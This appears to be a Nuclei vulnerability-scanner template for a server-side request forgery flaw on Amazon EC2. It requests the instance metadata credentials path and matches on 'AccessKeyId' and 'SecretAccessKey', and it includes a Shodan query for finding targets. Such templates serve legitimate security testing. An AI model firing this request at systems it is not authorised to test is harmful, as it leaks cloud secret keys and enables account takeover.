id: amazon-ec2-ssrf
info:
  name: Amazon EC2 SSRF
  author: DhiyaneshDk
  severity: critical
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
    cvss-score: 9.3
    cwe-id: CWE-441
  metadata:
    verified: "true"
    shodan-query: "Server: EC2ws"
  tags: aws,ec2,ssrf,amazon

requests:
  - raw:
      - |+
        GET {{BaseURL}}/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance HTTP/1.1
        Host: {{Hostname}}

    unsafe: true
    matchers:
      - type: word
        part: body
        words:
          - "AccessKeyId"
          - "SecretAccessKey"
        condition: and
